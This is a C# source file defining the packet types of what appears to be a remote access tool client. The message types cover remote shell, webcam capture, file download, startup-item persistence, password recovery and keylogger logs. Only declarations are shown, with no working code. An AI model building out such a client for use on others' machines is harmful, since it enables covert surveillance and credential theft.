using Client.Packets.ClientPackets;
using Client.Packets.ServerPackets;
using ZeroFormatter;

namespace Client.Packets
{
    public enum TypePackets
    {
        SetStatus, // Set Status
        DoAskElevate, // Run as Administrator
        GetAuthentication, GetAuthenticationResponse, SetAuthenticationSuccess, // Authentication
        GetMonitors, GetMonitorsResponse, GetDesktop, GetDesktopResponse, // Remote desktop
        GetExecuteShellCmd, GetExecuteShellCmdResponse, // Remote Shell
        GetAvailableWebcams, GetAvailableWebcamsResponse, GetWebcam, GetWebcamResponse, StopWebcam, // Remote Webcam
        GetDrives, GetDrivesResponse, SetStatusFileManager, GetDirectory, GetDirectoryResponse, DoDownloadFile, DoDownloadFileResponse, DoDownloadFileCancel, // File Manager
        GetProcesses, GetProcessesResponse, // Task Manager
        GetSysInfo, GetSysInfoResponse, // System Information
        GetStartupItems, GetStartupItemsResponse, DoStartupItemAdd, DoStartupItemRemove, // Startup Manager
        GetPasswords, GetPasswordsResponse, // Password Recovery
        GetKeyLoggerLogs, GetKeyLoggerLogsResponse // Key Logger
    }

    [Union(typeof(SetStatus), // Set Status
        typeof(DoAskElevate), // Run as Administrator
        typeof(GetAuthentication), typeof(GetAuthenticationResponse), typeof(SetAuthenticationSuccess), // Authentification
        typeof(GetMonitors), typeof(GetMonitorsResponse), typeof(GetDesktop), typeof(GetDesktopResponse), // Remote Desktop
        typeof(GetExecuteShellCmd), typeof(GetExecuteShellCmdResponse), // Remote Shell
        typeof(GetAvailableWebcams), typeof(GetAvailableWebcamsResponse), typeof(GetWebcam), typeof(GetWebcamResponse), typeof(StopWebcam), // Remote Webcam
        typeof(GetDrives), typeof(GetDrivesResponse), typeof(SetStatusFileManager), typeof(GetDirectory), typeof(GetDirectoryResponse), typeof(DoDownloadFile), typeof(DoDownloadFileResponse), typeof(DoDownloadFileCancel), // File Manager
        typeof(GetProcesses), typeof(GetProcessesResponse), // Task Manager
        typeof(GetSysInfo), typeof(GetSysInfoResponse), // System Information
        typeof(GetStartupItems), typeof(GetStartupItemsResponse), typeof(DoStartupItemAdd), typeof(DoStartupItemRemove), // Startup Manager
        typeof(GetPasswords), typeof(GetPasswordsResponse), // Password Recovery
        typeof(GetKeyLoggerLogs), typeof(GetKeyLoggerLogsResponse))] // Key Logger

    public abstract class IPackets
    {
        [UnionKey]
        public abstract TypePackets Type { get; }
    }
}
